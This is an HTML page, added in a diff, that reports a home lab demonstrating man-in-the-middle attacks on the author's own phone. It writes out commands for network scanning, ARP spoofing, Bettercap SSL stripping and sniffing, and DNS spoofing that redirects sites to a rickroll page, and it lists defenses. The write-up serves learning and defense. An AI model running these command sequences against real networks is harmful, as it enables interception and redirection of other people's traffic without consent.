@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MAN IN THE MIDDLE — FIELD REPORT</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323:wght@400&display=swap');
+
+  :root {
+    --green: #00ff41;
+    --dark-green: #003b00;
+    --amber: #ffb000;
+    --red: #ff2244;
+    --bg: #0a0a0a;
+    --grid: #0d1a0d;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--green);
+    font-family: 'VT323', monospace;
+    font-size: 20px;
+    line-height: 1.6;
+    cursor: default;
+    overflow-x: hidden;
+  }
+
+  /* scanline effect */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* grid bg */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--grid) 1px, transparent 1px),
+      linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 40px 20px 80px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* ── HEADER ── */
+  .header {
+    text-align: center;
+    border: 3px solid var(--green);
+    padding: 30px 20px;
+    margin-bottom: 40px;
+    position: relative;
+    box-shadow: 0 0 30px rgba(0,255,65,0.3), inset 0 0 30px rgba(0,255,65,0.05);
+  }
+  .header::before {
+    content: '▓▓▓ CLASSIFIED ▓▓▓';
+    position: absolute;
+    top: -14px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg);
+    padding: 0 12px;
+    font-family: 'Press Start 2P', monospace;
+    font-size: 9px;
+    color: var(--red);
+    letter-spacing: 2px;
+  }
+  .header::after {
+    content: '▓▓▓ LEVEL: HACKER ▓▓▓';
+    position: absolute;
+    bottom: -14px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg);
+    padding: 0 12px;
+    font-family: 'Press Start 2P', monospace;
+    font-size: 9px;
+    color: var(--amber);
+    letter-spacing: 2px;
+  }
+  .title {
+    font-family: 'Press Start 2P', monospace;
+    font-size: clamp(14px, 3vw, 22px);
+    color: var(--green);
+    text-shadow: 0 0 20px var(--green), 0 0 40px var(--green);
+    animation: flicker 4s infinite;
+    line-height: 1.8;
+  }
+  .subtitle {
+    margin-top: 14px;
+    color: var(--amber);
+    font-size: 22px;
+    letter-spacing: 3px;
+  }
+  .stats-row {
+    display: flex;
+    justify-content: center;
+    gap: 30px;
+    margin-top: 20px;
+    flex-wrap: wrap;
+  }
+  .stat {
+    font-family: 'Press Start 2P', monospace;
+    font-size: 8px;
+    color: var(--amber);
+    text-align: center;
+  }
+  .stat span { display: block; color: var(--green); font-size: 14px; margin-top: 4px; font-family: 'VT323', monospace; }
+
+  /* ── SECTION ── */
+  .section {
+    margin-bottom: 36px;
+    border: 2px solid var(--dark-green);
+    padding: 20px 24px;
+    position: relative;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .section:hover {
+    border-color: var(--green);
+    box-shadow: 0 0 16px rgba(0,255,65,0.15);
+  }
+  .section-title {
+    font-family: 'Press Start 2P', monospace;
+    font-size: 10px;
+    color: var(--amber);
+    margin-bottom: 14px;
+    text-shadow: 0 0 8px var(--amber);
+    position: absolute;
+    top: -12px;
+    background: var(--bg);
+    padding: 0 8px;
+    left: 20px;
+    white-space: nowrap;
+  }
+  .section p { margin-bottom: 10px; }
+
+  /* ── PHASE BLOCKS ── */
+  .phase {
+    border-left: 3px solid var(--green);
+    padding: 10px 16px;
+    margin-bottom: 18px;
+    background: rgba(0,255,65,0.03);
+  }
+  .phase-label {
+    font-family: 'Press Start 2P', monospace;
+    font-size: 8px;
+    color: var(--green);
+    margin-bottom: 8px;
+  }
+  .phase p { color: #b0ffb8; font-size: 19px; }
+
+  /* ── CODE BLOCKS ── */
+  .code {
+    background: #010e01;
+    border: 1px solid #00ff4155;
+    padding: 10px 14px;
+    font-family: 'VT323', monospace;
+    font-size: 18px;
+    color: #00ff41cc;
+    margin: 8px 0;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* ── ASCII DIAGRAM ── */
+  .diagram {
+    text-align: center;
+    font-family: 'VT323', monospace;
+    font-size: 20px;
+    color: var(--green);
+    padding: 20px;
+    border: 2px dashed #00ff4155;
+    margin: 10px 0;
+    line-height: 1.5;
+    background: rgba(0,255,65,0.03);
+    text-shadow: 0 0 6px var(--green);
+  }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 18px;
+  }
+  th {
+    font-family: 'Press Start 2P', monospace;
+    font-size: 8px;
+    color: var(--bg);
+    background: var(--green);
+    padding: 8px 10px;
+    text-align: left;
+  }
+  td {
+    padding: 7px 10px;
+    border-bottom: 1px solid #00ff4122;
+    color: #b0ffb8;
+  }
+  tr:hover td { background: rgba(0,255,65,0.06); color: var(--green); }
+  td:first-child { color: var(--amber); font-family: 'Press Start 2P', monospace; font-size: 8px; vertical-align: middle; }
+
+  /* ── BADGE ── */
+  .badge {
+    display: inline-block;
+    font-family: 'Press Start 2P', monospace;
+    font-size: 7px;
+    padding: 4px 8px;
+    border: 1px solid currentColor;
+    margin: 2px;
+  }
+  .badge.red { color: var(--red); }
+  .badge.green { color: var(--green); }
+  .badge.amber { color: var(--amber); }
+
+  /* ── BLINK ── */
+  .blink { animation: blink 1s step-end infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @keyframes flicker {
+    0%,96%,100% { opacity: 1; }
+    97% { opacity: 0.6; }
+    98% { opacity: 1; }
+    99% { opacity: 0.4; }
+  }
+
+  /* ── FOOTER ── */
+  .footer {
+    text-align: center;
+    font-family: 'Press Start 2P', monospace;
+    font-size: 8px;
+    color: #00ff4155;
+    margin-top: 50px;
+    padding-top: 20px;
+    border-top: 1px dashed #00ff4133;
+    letter-spacing: 2px;
+  }
+
+  /* ── PROGRESS BAR ── */
+  .pbar-wrap { margin: 6px 0 12px; }
+  .pbar-label { font-family: 'Press Start 2P', monospace; font-size: 7px; color: var(--amber); margin-bottom: 4px; }
+  .pbar { height: 14px; background: #011401; border: 1px solid #00ff4144; overflow: hidden; }
+  .pbar-fill { height: 100%; background: repeating-linear-gradient(90deg, var(--green) 0px, var(--green) 8px, #00aa33 8px, #00aa33 12px); animation: fill 2s ease-out forwards; }
+
+  .pixel-trophy {
+    font-size: 48px;
+    display: block;
+    text-align: center;
+    margin: 10px 0;
+    filter: drop-shadow(0 0 10px var(--amber));
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="title">MAN-IN-THE-MIDDLE<br>ATTACK — FIELD REPORT</div>
+    <div class="subtitle">ARP &amp; DNS SPOOFING LAB</div>
+    <div class="stats-row">
+      <div class="stat">TIME<span>~3 HRS</span></div>
+      <div class="stat">PACKETS<span>34,000+</span></div>
+      <div class="stat">ATTACKS<span>6</span></div>
+      <div class="stat">LEGAL<span>✅ ZERO</span></div>
+    </div>
+  </div>
+
+  <!-- WHAT IS MITM -->
+  <div class="section">
+    <div class="section-title">◈ WHAT IS A MITM ATTACK?</div>
+    <p>A <span style="color:var(--amber)">Man-in-the-Middle (MITM)</span> attack happens when an attacker secretly positions themselves between two communicating devices — like sitting between you and the internet, reading everything you send and receive.</p>
+    <p>The victim has no idea. Traffic flows normally. But the attacker sees <em style="color:var(--red)">everything</em>.</p>
+    <div class="diagram">
+NORMAL:  📱 Phone ──────────────────► 🌐 Internet
+
+ATTACK:  📱 Phone ──► 💻 ATTACKER ──► 🌐 Internet
+                           ↑
+                      reads all data
+    </div>
+  </div>
+
+  <!-- NETWORK SETUP -->
+  <div class="section">
+    <div class="section-title">◈ NETWORK SETUP</div>
+    <p>The lab used three devices forming a controlled network:</p>
+    <div class="diagram">
+        🌐 INTERNET
+            │
+     📱 Phone 2  (USB Tethered)
+            │  gives internet to laptop
+        💻 LAPTOP  ──── WiFi Hotspot (wlp4s0)
+            │
+     📱 Phone 1  ← TARGET  [10.42.0.46]
+    </div>
+    <p>The laptop acts as the <span style="color:var(--amber)">gateway</span> for Phone 1, giving it internet — and making it the perfect MITM position.</p>
+  </div>
+
+  <!-- PHASES -->
+  <div class="section">
+    <div class="section-title">◈ PHASE-BY-PHASE BREAKDOWN</div>
+
+    <div class="phase">
+      <div class="phase-label">[ PHASE 1 ] — RECON &amp; SETUP</div>
+      <p>Identified network interfaces and confirmed Python was available. No extra packages needed for the ARP spoofer.</p>
+      <div class="code">ip link show
+ip addr show</div>
+    </div>
+
+    <div class="phase">
+      <div class="phase-label">[ PHASE 2 ] — TARGET DISCOVERY</div>
+      <p>Scanned the local network to find connected devices. Phone 1 found at <span style="color:var(--green)">10.42.0.46</span>.</p>
+      <div class="code">ip neigh
+nmap -sn 10.42.0.0/24</div>
+    </div>
+
+    <div class="phase">
+      <div class="phase-label">[ PHASE 3 ] — ARP SPOOFING</div>
+      <p><span style="color:var(--amber)">ARP (Address Resolution Protocol)</span> maps IP addresses to MAC addresses. By sending fake ARP replies, the attacker tricks the target into sending all traffic through the attacker's machine.</p>
+      <div class="code">sudo python3 arpspoof.py 10.42.0.46 -f</div>
+      <p>Result: IPv4 forwarding enabled. Laptop is now between Phone 1 and the internet.</p>
+    </div>
+
+    <div class="phase">
+      <div class="phase-label">[ PHASE 4 ] — TRAFFIC CAPTURE (WIRESHARK)</div>
+      <p>Wireshark captures all packets passing through the interface. With a simple filter, every DNS request (= every website visit) from Phone 1 became visible.</p>
+      <div class="code">sudo apt install wireshark -y
+# Filter used inside Wireshark:
+ip.addr == 10.42.0.46 && dns</div>
+      <p style="color:var(--red)">Result: 34,000+ packets captured. Every website Phone 1 visited — visible in real time.</p>
+    </div>
+
+    <div class="phase">
+      <div class="phase-label">[ PHASE 5 ] — BETTERCAP (PRO MITM)</div>
+      <p>Bettercap is a full-featured MITM framework. It combines ARP spoofing, HTTP proxying, SSL stripping, and sniffing in one tool.</p>
+      <div class="code">sudo bettercap -iface wlp4s0
+
+# Inside bettercap:
+net.probe on
+set arp.spoof.targets 10.42.0.46
+arp.spoof on
+set https.proxy.sslstrip true
+http.proxy on
+net.sniff on</div>
+      <p>Captured metadata: <span style="color:var(--amber)">[net.sniff.https] Android → edge-mqtt.facebook.com</span></p>
+      <p>Even HTTPS leaks <em>which servers</em> the device is talking to.</p>
+    </div>
+
+    <div class="phase">
+      <div class="phase-label">[ PHASE 6 ] — DNS SPOOFING + RICKROLL 😂</div>
+      <p><span style="color:var(--amber)">DNS spoofing</span> poisons the DNS responses so that domain names resolve to a fake IP — the attacker's machine. Apache was set up to serve a rickroll page.</p>
+      <div class="code">sudo apt install apache2 -y
+sudo systemctl start apache2
+# Wrote rickroll HTML to /var/www/html/index.html
+
+# In bettercap:
+set dns.spoof.domains neverssl.com,speedtest.net
+set dns.spoof.address 10.42.0.1
+dns.spoof on</div>
+      <p style="color:var(--red)">Phone 1 opens speedtest.net → Gets Rickrolled. Attack confirmed. 🎵</p>
+    </div>
+  </div>
+
+  <!-- HOW ARP WORKS -->
+  <div class="section">
+    <div class="section-title">◈ HOW ARP SPOOFING WORKS (SIMPLE)</div>
+    <p>Every device on a network uses ARP to ask: <span style="color:var(--amber)">"Who has IP X? Tell me your MAC address."</span></p>
+    <p>ARP has NO authentication. Anyone can reply. The attacker sends fake replies to both the target and the gateway:</p>
+    <div class="diagram">
+Attacker → Target:  "The gateway's MAC? That's ME."
+Attacker → Gateway: "The target's MAC? That's ME."
+
+Both now send traffic through the attacker. ✓
+    </div>
+  </div>
+
+  <!-- TOOLS TABLE -->
+  <div class="section">
+    <div class="section-title">◈ TOOLS USED</div>
+    <table>
+      <tr><th>TOOL</th><th>PURPOSE</th></tr>
+      <tr><td>Python 3</td><td>Ran the ARP spoofer script</td></tr>
+      <tr><td>ARP-Spoofer</td><td>ARP cache poisoning (GitHub: EONRaider)</td></tr>
+      <tr><td>Wireshark</td><td>Packet capture and real-time analysis</td></tr>
+      <tr><td>Bettercap</td><td>Professional MITM framework</td></tr>
+      <tr><td>Apache2</td><td>Hosted the fake / rickroll page</td></tr>
+      <tr><td>nmap</td><td>Network scanning — found the target IP</td></tr>
+      <tr><td>ip / arp</td><td>Network interface and neighbor inspection</td></tr>
+    </table>
+  </div>
+
+  <!-- WHAT EACH ATTACK PROVED -->
+  <div class="section">
+    <div class="section-title">◈ WHAT EACH ATTACK PROVED</div>
+    <table>
+      <tr><th>ATTACK</th><th>WHAT IT PROVED</th></tr>
+      <tr><td>ARP Spoofing</td><td>Attacker can intercept ALL traffic on LAN</td></tr>
+      <tr><td>Wireshark Capture</td><td>HTTP traffic is completely readable</td></tr>
+      <tr><td>DNS Spoofing</td><td>Any website can be redirected silently</td></tr>
+      <tr><td>Bettercap MITM</td><td>HTTPS still leaks server metadata</td></tr>
+      <tr><td>Rickroll</td><td>Social engineering is trivially easy</td></tr>
+    </table>
+  </div>
+
+  <!-- HTTP vs HTTPS -->
+  <div class="section">
+    <div class="section-title">◈ HTTP vs HTTPS</div>
+    <p>
+      <span class="badge red">HTTP</span> All content visible — URLs, passwords, cookies, everything.<br>
+      <span class="badge green">HTTPS</span> Content encrypted — but the domain name is still exposed via DNS and SNI.<br>
+      <span class="badge amber">SSL STRIP</span> Downgrades HTTPS to HTTP silently. User doesn't notice.
+    </p>
+    <p style="margin-top:12px;">Bottom line: <span style="color:var(--red)">no encryption = no privacy. Even HTTPS isn't perfect against a MITM on your LAN.</span></p>
+  </div>
+
+  <!-- DEFENSE -->
+  <div class="section">
+    <div class="section-title">◈ HOW TO DEFEND</div>
+    <table>
+      <tr><th>ATTACK</th><th>DEFENSE</th></tr>
+      <tr><td>ARP Spoofing</td><td>Static ARP entries or use a VPN</td></tr>
+      <tr><td>DNS Spoofing</td><td>Use DNSSEC / trusted DNS over HTTPS</td></tr>
+      <tr><td>MITM Attack</td><td>Always verify HTTPS, use VPN on public WiFi</td></tr>
+      <tr><td>Packet Sniffing</td><td>Encrypted protocols only (TLS 1.3+)</td></tr>
+      <tr><td>Fake WiFi</td><td>Verify network name before connecting</td></tr>
+    </table>
+  </div>
+
+  <!-- CONCLUSION -->
+  <div class="section">
+    <div class="section-title">◈ CONCLUSION</div>
+    <p>This lab proved five hard truths:</p>
+    <div class="phase"><p>① Any device on a shared network is vulnerable to MITM attacks.</p></div>
+    <div class="phase"><p>② HTTP traffic is completely exposed — passwords, sessions, everything.</p></div>
+    <div class="phase"><p>③ Even HTTPS leaks metadata — which apps, which servers you talk to.</p></div>
+    <div class="phase"><p>④ DNS can be poisoned to redirect users to any destination silently.</p></div>
+    <div class="phase"><p>⑤ This is why cybersecurity matters. Networks are not trustworthy by default.</p></div>
+  </div>
+
+  <!-- ACHIEVEMENT -->
+  <div class="section" style="text-align:center; border-color: var(--amber); box-shadow: 0 0 20px rgba(255,176,0,0.2);">
+    <div class="section-title" style="color:var(--green);">◈ ACHIEVEMENT UNLOCKED</div>
+    <span class="pixel-trophy">🏆</span>
+    <p style="font-family:'Press Start 2P',monospace; font-size:10px; color:var(--amber); line-height:2;">
+      ETHICAL HACKER<br>
+      <span style="color:var(--green); font-size:14px; font-family:'VT323',monospace;">Built a complete working MITM lab in ~3 hours from scratch.</span>
+    </p>
+    <p style="margin-top:14px;">
+      <span class="badge green">6 ATTACKS PERFORMED</span>
+      <span class="badge amber">34,000+ PACKETS</span>
+      <span class="badge green">LEGAL ✅</span>
+    </p>
+    <p style="margin-top:16px; color:#b0ffb8;">Started with a GitHub link. Ended with a fully operational hacking lab. <span class="blink">█</span></p>
+  </div>
+
+  <div class="footer">
+    ◈ ETHICAL USE ONLY — ALWAYS GET PERMISSION ◈<br><br>
+    FIELD REPORT COMPLETE <span class="blink">█</span>
+  </div>
+
+</div>
+</body>
+</html>
